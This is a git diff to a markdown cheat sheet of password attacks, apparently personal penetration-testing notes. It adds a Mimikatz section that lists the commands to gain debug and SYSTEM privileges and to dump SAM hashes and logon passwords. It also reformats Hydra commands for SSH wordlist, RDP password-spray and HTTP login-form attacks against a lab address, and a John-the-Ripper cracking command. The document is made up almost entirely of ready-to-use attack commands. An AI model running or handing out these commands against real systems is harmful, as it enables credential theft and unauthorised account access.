@@ -1,16 +1,48 @@
-## Commands/Tools to attack network services
+## Getting passwords/hashes  
 
-SSH wordlist attack with Hydra  
+### Mimikatz  
+
+Run mimikatz as an admin  
+```
+PS> .\mimikatz.exe
+```  
+
+Enable SeDebugPrivilege  
+```
+privilege::debug
+```
+
+Obtain SYSTEM privs  
+```
+token::elevate
+```  
+
+Dump hashes fromthe SAM database  
+```
+lsadump::sam 
+```  
+
+Get passwords/hashes from multiple places  
+```
+sekurlsa::logonpasswords
+```
+
+
+## Commands/Tools to guess passwords against network services  
+
+### Hydra  
+
+SSH wordlist attack 
 ``` 
 hydra -l myuser -P password.list -s 2222 ssh://10.10.10.43
 ```
 
-RDP password spray attack with Hydra  
+RDP password spray
 ``` 
 hydra -L username.list -p "myPassword123" rdp://10.10.10.43
 ```
 
-HTTP wordlist attack with Hydra  
+HTTP wordlist attack
 ```
 hydra -l myuser -P password.list 10.10.10.43 http-post-form "/login:user_param=user&password_param=^PASS^:Failure Message"
 ```
@@ -59,5 +91,7 @@ $ locate *2john
 ...
 ```
 
-### John-the-Ripper
+### John-the-Ripper  
+```
 john --wordlist=ssh.passwords --rules=myCustomRules ssh.hash
+```
